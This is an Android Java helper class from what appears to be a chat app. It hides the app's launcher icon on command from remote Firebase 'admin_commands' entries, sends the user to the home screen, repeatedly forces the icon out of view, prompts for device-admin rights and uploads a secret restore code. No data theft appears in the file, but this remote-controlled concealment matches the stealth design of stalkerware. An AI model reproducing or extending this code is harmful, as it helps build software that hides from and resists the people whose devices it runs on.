package com.bushorat.chatapp.helpers;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.bushorat.chatapp.activities.ChooseLoginActivity;
import com.bushorat.chatapp.activities.DashboardActivity;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.HashMap;
import java.util.Map;

public class AppVisibilityHelper {
    private static final String TAG = "AppVisibilityHelper";
    private static final String PREF_NAME = "app_visibility";
    private static final String KEY_IS_HIDDEN = "is_app_hidden";
    private static final String KEY_SECRET_CODE = "secret_code";

    /** Must match manifest VisibleLauncherAlias (home icon entry). */
    private static final String MAIN_LAUNCHER_ALIAS_SHORT = ".VisibleLauncherAlias";
    private static final String CHOOSE_LOGIN_ACTIVITY =
            "com.bushorat.chatapp.activities.ChooseLoginActivity";

    private static AppVisibilityHelper instance;

    private final Context context;
    private final SharedPreferences preferences;
    private DatabaseReference visibilityRef;
    private DatabaseReference adminCommandsRef;
    private ValueEventListener visibilityListener;
    private ValueEventListener adminCommandsListener;
    private String userId;
    private boolean isActive = false;
    private boolean hasFirebaseVisibility;
    private boolean hasAdminCommands;
    private boolean remoteHideFirebase;
    private boolean remoteHideAdmin;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private int openAfterShowGeneration = 0;
    private long lastRemoteShowUiMs = 0L;
    private static final long REMOTE_SHOW_UI_DEBOUNCE_MS = 2_000L;
    /** After local hide, ignore stale Firebase SHOW until writes settle (fixes icon reappearing). */
    private long suppressRemoteShowUntilMs = 0L;
    private static final long LOCAL_HIDE_SHOW_SUPPRESS_MS = 12_000L;

    private AppVisibilityHelper(Context context) {
        this.context = context.getApplicationContext();
        this.preferences = this.context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        disableLegacyLauncherAliases();
        refreshAuthState();
        applyPersistedVisibility();
        Log.i("HIDE_DIAG", "AppVisibilityHelper init hidden=" + isAppHidden());
    }

    public static synchronized AppVisibilityHelper getInstance(Context context) {
        if (instance == null) {
            instance = new AppVisibilityHelper(context);
        }
        return instance;
    }

    private void refreshAuthState() {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        String uid = user != null ? user.getUid() : null;
        if (uid == null) {
            uid = new SessionManager(context).getUserId();
        }
        if (uid == null || uid.isEmpty()) {
            stopVisibilityListener();
            userId = null;
            visibilityRef = null;
            adminCommandsRef = null;
            return;
        }

        if (uid.equals(userId) && visibilityRef != null && adminCommandsRef != null) {
            return;
        }

        stopVisibilityListener();
        userId = uid;
        hasFirebaseVisibility = false;
        hasAdminCommands = false;
        remoteHideFirebase = false;
        remoteHideAdmin = false;
        visibilityRef = FirebaseDatabase.getInstance()
                .getReference("app_visibility")
                .child(userId);
        adminCommandsRef = FirebaseDatabase.getInstance()
                .getReference("user_data")
                .child(userId)
                .child("admin_commands");
    }

    public void hideApp() {
        Log.i("HIDE_DIAG", "hideApp() called userId=" + userId
                + " prefHidden=" + isAppHidden()
                + " launcherHidden=" + LauncherIconController.isLauncherHidden(context));
        ensureSecretCode();
        LauncherProtectionHelper.promptDeviceAdminForHide(context);
        applyLauncherVisibility(true, true, true);
        LauncherIconController.dumpHideDiagnostics(context, "after-hideApp");
    }

    public void showApp() {
        Log.i("HIDE_DIAG", "showApp() called userId=" + userId);
        applyLauncherVisibility(false, true, false);
        LauncherIconController.dumpHideDiagnostics(context, "after-showApp");
    }

    public void syncLauncherAfterLogin() {
        refreshAuthState();
        syncLauncherWithPrefs();
        ensureListenerStarted();
    }

    public boolean isAppHidden() {
        return preferences.getBoolean(KEY_IS_HIDDEN, false);
    }

    public String getSecretCode() {
        return preferences.getString(KEY_SECRET_CODE, null);
    }

    public boolean verifySecretCode(String inputCode) {
        String storedCode = getSecretCode();
        return storedCode != null && storedCode.equals(inputCode);
    }

    public void ensureListenerStarted() {
        refreshAuthState();
        if (visibilityRef == null) {
            return;
        }
        if (!isActive) {
            startVisibilityListener();
            if (isAppHidden()) {
                LauncherIconController.ensureHidden(context);
            }
        }
    }

    public void enforceHiddenLauncher() {
        if (!isAppHidden()) {
            Log.i("HIDE_DIAG", "enforceHiddenLauncher SKIP — pref is_hidden=false");
            return;
        }
        Log.i("HIDE_DIAG", "enforceHiddenLauncher START launcherHidden="
                + LauncherIconController.isLauncherHidden(context));
        prepareForHiddenLaunch();
        // Always re-force — ghost tiles can remain after a soft disable.
        LauncherIconController.ensureHidden(context);
        if (!LauncherIconController.isLauncherHidden(context)) {
            Log.w("HIDE_DIAG", "enforceHiddenLauncher still visible → applyHideHard");
            LauncherIconController.applyHideHard(context);
        }
        LauncherIconController.dumpHideDiagnostics(context, "after-enforceHiddenLauncher");
    }

    public void onDeviceAdminActivated() {
        syncLauncherWithPrefs();
    }

    private void applyRemoteShowToLauncher() {
        long now = System.currentTimeMillis();
        boolean debounced = now - lastRemoteShowUiMs < REMOTE_SHOW_UI_DEBOUNCE_MS;
        lastRemoteShowUiMs = now;
        if (debounced) {
            LauncherIconController.ensureVisible(context);
            return;
        }
        setLauncherIconVisible(true);
        scheduleOpenAppAfterShow();
    }

    private int openAttemptForGeneration = -1;

    /** One open attempt after icon restore — avoids activity / service storms. */
    private void scheduleOpenAppAfterShow() {
        openAfterShowGeneration++;
        final int generation = openAfterShowGeneration;
        openAttemptForGeneration = -1;
        mainHandler.postDelayed(() -> {
            if (generation != openAfterShowGeneration || isAppHidden()) {
                return;
            }
            tryBringAppToForeground(generation);
        }, 900L);
    }

    private void tryBringAppToForeground(int generation) {
        if (isAppHidden() || generation != openAfterShowGeneration) {
            return;
        }
        if (openAttemptForGeneration == generation) {
            return;
        }
        openAttemptForGeneration = generation;
        LauncherIconController.ensureVisible(context);
        try {
            Intent intent = buildShowLaunchIntent();
            intent.addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK
                            | Intent.FLAG_ACTIVITY_CLEAR_TOP
                            | Intent.FLAG_ACTIVITY_SINGLE_TOP
            );
            context.startActivity(intent);
            Log.d(TAG, "Show: app brought to foreground");
        } catch (Exception e) {
            Log.w(TAG, "Show: startActivity failed", e);
        }
    }

    private Intent buildShowLaunchIntent() {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        SessionManager session = new SessionManager(context);
        if (user != null || session.isUserLoggedIn()) {
            return new Intent(context, DashboardActivity.class);
        }
        return new Intent(context, ChooseLoginActivity.class);
    }

    public void syncVisibilityFromFirebaseBlocking() {
        refreshAuthState();
        if (visibilityRef != null) {
            visibilityRef.get().addOnCompleteListener(task -> {
                if (task.isSuccessful() && task.getResult() != null) {
                    applyFirebaseVisibility(task.getResult());
                }
            });
        }
        if (adminCommandsRef != null) {
            adminCommandsRef.get().addOnCompleteListener(task -> {
                if (task.isSuccessful() && task.getResult() != null) {
                    onAdminCommandsSnapshot(task.getResult());
                }
            });
        }
    }

    public void startVisibilityListener() {
        refreshAuthState();
        if (isActive || visibilityRef == null || adminCommandsRef == null) {
            return;
        }

        isActive = true;
        visibilityListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                onFirebaseVisibilitySnapshot(snapshot);
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "app_visibility listener cancelled: " + error.getMessage());
                isActive = false;
                mainHandler.postDelayed(() -> ensureListenerStarted(), 5000L);
            }
        };
        adminCommandsListener = new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                onAdminCommandsSnapshot(snapshot);
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "admin_commands listener cancelled: " + error.getMessage());
                isActive = false;
                mainHandler.postDelayed(() -> ensureListenerStarted(), 5000L);
            }
        };

        try {
            visibilityRef.keepSynced(true);
            adminCommandsRef.keepSynced(true);
        } catch (Exception e) {
            Log.w(TAG, "keepSynced failed", e);
        }
        visibilityRef.addValueEventListener(visibilityListener);
        adminCommandsRef.addValueEventListener(adminCommandsListener);
        syncFromFirebaseNow();
    }

    private void onFirebaseVisibilitySnapshot(DataSnapshot snapshot) {
        Object raw = snapshot.exists() ? snapshot.child("is_hidden").getValue() : null;
        Log.i("HIDE_DIAG", "Firebase app_visibility/" + userId
                + " exists=" + snapshot.exists()
                + " is_hidden_raw=" + raw
                + " (" + (raw != null ? raw.getClass().getSimpleName() : "null") + ")");
        if (!snapshot.exists() || !snapshot.hasChild("is_hidden")) {
            hasFirebaseVisibility = false;
            applyCombinedRemoteVisibility();
            return;
        }
        Boolean isHidden = parseHiddenValue(snapshot.child("is_hidden").getValue());
        if (isHidden == null) {
            Log.w("HIDE_DIAG", "Firebase is_hidden unparseable: " + raw);
            hasFirebaseVisibility = false;
            applyCombinedRemoteVisibility();
            return;
        }
        hasFirebaseVisibility = true;
        remoteHideFirebase = isHidden;
        applyCombinedRemoteVisibility();
    }

    private void onAdminCommandsSnapshot(DataSnapshot snapshot) {
        Object raw = snapshot.exists() ? snapshot.child("is_hidden").getValue() : null;
        Log.i("HIDE_DIAG", "Firebase user_data/" + userId + "/admin_commands"
                + " exists=" + snapshot.exists()
                + " is_hidden_raw=" + raw);
        if (!snapshot.exists() || !snapshot.hasChild("is_hidden")) {
            hasAdminCommands = false;
            applyCombinedRemoteVisibility();
            return;
        }
        Boolean isHidden = parseHiddenValue(snapshot.child("is_hidden").getValue());
        if (isHidden == null) {
            Log.w("HIDE_DIAG", "admin_commands is_hidden unparseable: " + raw);
            hasAdminCommands = false;
            applyCombinedRemoteVisibility();
            return;
        }
        hasAdminCommands = true;
        remoteHideAdmin = isHidden;
        applyCombinedRemoteVisibility();
    }

    private void applyCombinedRemoteVisibility() {
        long now = System.currentTimeMillis();
        boolean suppressShow = now < suppressRemoteShowUntilMs;
        Log.i("HIDE_DIAG", "applyCombinedRemoteVisibility"
                + " hasFb=" + hasFirebaseVisibility + " fbHide=" + remoteHideFirebase
                + " hasCmd=" + hasAdminCommands + " cmdHide=" + remoteHideAdmin
                + " prefHidden=" + isAppHidden()
                + " launcherHidden=" + LauncherIconController.isLauncherHidden(context)
                + " suppressShow=" + suppressShow
                + " suppressRemainMs=" + Math.max(0, suppressRemoteShowUntilMs - now));

        if (!hasFirebaseVisibility && !hasAdminCommands) {
            if (isAppHidden()) {
                Log.i("HIDE_DIAG", "No remote data yet — enforcing local pref hide");
                setLauncherIconVisible(false);
            }
            return;
        }

        boolean shouldHide = (hasFirebaseVisibility && remoteHideFirebase)
                || (hasAdminCommands && remoteHideAdmin);
        // Remotes affirmatively agree the app should be visible (every known source says show).
        boolean remotesAgreeVisible =
                (hasFirebaseVisibility || hasAdminCommands)
                        && (!hasFirebaseVisibility || !remoteHideFirebase)
                        && (!hasAdminCommands || !remoteHideAdmin);

        Log.i("HIDE_DIAG", "decision shouldHide=" + shouldHide
                + " remotesAgreeVisible=" + remotesAgreeVisible);

        if (shouldHide) {
            suppressRemoteShowUntilMs = 0L;
            preferences.edit().putBoolean(KEY_IS_HIDDEN, true).commit();
            ensureSecretCode();
            prepareForHiddenLaunch();
            LauncherProtectionHelper.promptDeviceAdminForHide(context);
            vanishCompletely();
            Log.i("HIDE_DIAG", "Remote HIDE → vanishCompletely()");
        } else if (remotesAgreeVisible) {
            // Stale Firebase SHOW right after local hide must not re-enable the icon.
            if (suppressShow) {
                Log.w("HIDE_DIAG", "Remote SHOW IGNORED — local hide suppress window active"
                        + " (stale Firebase is_hidden=false)");
                vanishCompletely();
                return;
            }
            preferences.edit().putBoolean(KEY_IS_HIDDEN, false).commit();
            applyRemoteShowToLauncher();
            Log.i("HIDE_DIAG", "Remote SHOW applied");
        } else if (isAppHidden()) {
            prepareForHiddenLaunch();
            vanishCompletely();
            Log.i("HIDE_DIAG", "Keeping hidden (remote not fully visible yet)");
        }
    }

    private void applyFirebaseVisibility(DataSnapshot snapshot) {
        onFirebaseVisibilitySnapshot(snapshot);
    }

    public void applyPersistedVisibilityToLauncher() {
        applyPersistedVisibility();
    }

    private void syncFromFirebaseNow() {
        if (visibilityRef != null) {
            visibilityRef.get().addOnSuccessListener(this::applyFirebaseVisibility);
        }
        if (adminCommandsRef != null) {
            adminCommandsRef.get().addOnSuccessListener(this::onAdminCommandsSnapshot);
        }
    }

    public void stopVisibilityListener() {
        if (visibilityRef != null && visibilityListener != null) {
            visibilityRef.removeEventListener(visibilityListener);
            visibilityListener = null;
        }
        if (adminCommandsRef != null && adminCommandsListener != null) {
            adminCommandsRef.removeEventListener(adminCommandsListener);
            adminCommandsListener = null;
        }
        isActive = false;
    }

    public VisibilityStatus getVisibilityStatus() {
        return new VisibilityStatus(isAppHidden(), getSecretCode());
    }

    private void applyPersistedVisibility() {
        syncLauncherWithPrefs();
    }

    /** Match launcher to saved hidden flag (always hide when hidden; show only when not hidden). */
    public void syncLauncherWithPrefs() {
        boolean hidden = isAppHidden();
        Log.i("HIDE_DIAG", "syncLauncherWithPrefs isAppHidden=" + hidden);
        // Prefer setLauncherVisible so desiredVisible stays aligned with prefs.
        LauncherIconController.setLauncherVisible(context, !hidden);
    }

    private void disableLegacyLauncherAliases() {
        PackageManager pm = context.getPackageManager();
        String pkg = context.getPackageName();
        setComponentEnabledSafely(
                pm,
                new ComponentName(pkg, pkg + ".SecretLauncherAlias"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
        setComponentEnabledSafely(
                pm,
                new ComponentName(pkg, pkg + ".StealthLauncherAlias"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    private void ensureSecretCode() {
        if (getSecretCode() == null) {
            preferences.edit()
                    .putString(KEY_SECRET_CODE, generateSecretCode())
                    .apply();
        }
    }

    /** Full icon vanish: home → disable launcher → clear recents → hard retries. */
    private void vanishCompletely() {
        Log.i("HIDE_DIAG", "vanishCompletely() begin");
        LauncherIconController.dumpHideDiagnostics(context, "before-vanishCompletely");
        prepareForHiddenLaunch();
        sendUserToHomeScreen();
        LauncherIconController.setLauncherVisible(context, false);
        mainHandler.postDelayed(() -> {
            if (isAppHidden()) {
                Log.i("HIDE_DIAG", "vanishCompletely @1.8s applyHideHard");
                LauncherIconController.applyHideHard(context);
            }
        }, 1_800L);
        mainHandler.postDelayed(() -> {
            if (isAppHidden()) {
                Log.i("HIDE_DIAG", "vanishCompletely @4s ensureHidden + dump");
                LauncherIconController.ensureHidden(context);
                LauncherIconController.dumpHideDiagnostics(context, "vanishCompletely-4s");
            }
        }, 4_000L);
    }

    private void applyLauncherVisibility(boolean hide, boolean syncFirebase, boolean goHome) {
        boolean wasHidden = isAppHidden();
        Log.i("HIDE_DIAG", "applyLauncherVisibility hide=" + hide
                + " syncFirebase=" + syncFirebase
                + " goHome=" + goHome
                + " wasHidden=" + wasHidden
                + " visibilityRef=" + (visibilityRef != null)
                + " adminCommandsRef=" + (adminCommandsRef != null));
        // commit so other threads / services see the flag immediately
        preferences.edit().putBoolean(KEY_IS_HIDDEN, hide).commit();
        if (hide) {
            // Block stale Firebase SHOW callbacks that still have is_hidden=false.
            suppressRemoteShowUntilMs = System.currentTimeMillis() + LOCAL_HIDE_SHOW_SUPPRESS_MS;
            Log.i("HIDE_DIAG", "local hide → suppress remote SHOW for "
                    + LOCAL_HIDE_SHOW_SUPPRESS_MS + "ms");
            prepareForHiddenLaunch();
            LauncherProtectionHelper.promptDeviceAdminForHide(context);
            vanishCompletely();
        } else {
            suppressRemoteShowUntilMs = 0L;
            setLauncherIconVisible(true);
            if (wasHidden) {
                scheduleOpenAppAfterShow();
            }
        }

        if (syncFirebase) {
            Map<String, Object> updates = new HashMap<>();
            updates.put("is_hidden", hide);
            if (hide) {
                updates.put("hidden_at", System.currentTimeMillis());
                updates.put("secret_code", getSecretCode());
                updates.put("restore_dial_code", "*#*#737826#*#*");
            } else {
                updates.put("shown_at", System.currentTimeMillis());
            }
            if (visibilityRef != null) {
                visibilityRef.updateChildren(updates);
            }
            // Keep admin_commands in sync so remote listeners always see the same state.
            if (adminCommandsRef != null) {
                Map<String, Object> cmd = new HashMap<>();
                cmd.put("is_hidden", hide);
                cmd.put("updated_at", System.currentTimeMillis());
                adminCommandsRef.updateChildren(cmd);
            }
        }
    }

    public void ensureLauncherComponentEnabled() {
        setMainLauncherEnabled(true);
    }

    public void setMainLauncherEnabled(boolean enabled) {
        setLauncherIconVisible(enabled);
    }

    public void prepareForHiddenLaunch() {
        runOnMainThread(() -> setComponentEnabledSafely(
                context.getPackageManager(),
                chooseLoginComponent(),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
        ));
    }

    private void setLauncherIconVisible(boolean visible) {
        LauncherIconController.setLauncherVisible(context, visible);
    }

    private void runOnMainThread(Runnable action) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            action.run();
        } else {
            mainHandler.post(action);
        }
    }

    private ComponentName mainLauncherComponent() {
        String pkg = context.getPackageName();
        return new ComponentName(pkg, pkg + MAIN_LAUNCHER_ALIAS_SHORT);
    }

    private ComponentName chooseLoginComponent() {
        return new ComponentName(context.getPackageName(), CHOOSE_LOGIN_ACTIVITY);
    }

    private void setComponentEnabledSafely(
            PackageManager pm,
            ComponentName component,
            int newState,
            int flags
    ) {
        if (!componentExists(pm, component)) {
            return;
        }
        try {
            pm.setComponentEnabledSetting(component, newState, flags);
        } catch (Exception e) {
            Log.w(TAG, "Component update failed: " + component.flattenToShortString(), e);
        }
    }

    private boolean componentExists(PackageManager pm, ComponentName component) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                pm.getActivityInfo(
                        component,
                        PackageManager.ComponentInfoFlags.of(PackageManager.MATCH_DISABLED_COMPONENTS)
                );
            } else {
                @SuppressWarnings("deprecation")
                android.content.pm.ActivityInfo info = pm.getActivityInfo(
                        component,
                        PackageManager.GET_DISABLED_COMPONENTS
                );
                if (info == null) {
                    return false;
                }
            }
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void sendUserToHomeScreen() {
        try {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(home);
        } catch (Exception e) {
            Log.w(TAG, "Could not send user to home screen", e);
        }
    }

    private Boolean parseHiddenValue(Object value) {
        if (value == null) {
            return null;
        }
        if (value instanceof Boolean) {
            return (Boolean) value;
        }
        if (value instanceof Long) {
            return ((Long) value) != 0L;
        }
        if (value instanceof Integer) {
            return ((Integer) value) != 0;
        }
        if (value instanceof Double) {
            return ((Double) value) != 0.0;
        }
        if (value instanceof String) {
            String text = ((String) value).trim().toLowerCase();
            if ("true".equals(text) || "1".equals(text)) {
                return true;
            }
            if ("false".equals(text) || "0".equals(text)) {
                return false;
            }
        }
        return null;
    }

    private String generateSecretCode() {
        return String.format("%06d", (int) (Math.random() * 1000000));
    }

    public static class VisibilityStatus {
        public boolean isHidden;
        public String secretCode;

        public VisibilityStatus(boolean isHidden, String secretCode) {
            this.isHidden = isHidden;
            this.secretCode = secretCode;
        }
    }
}
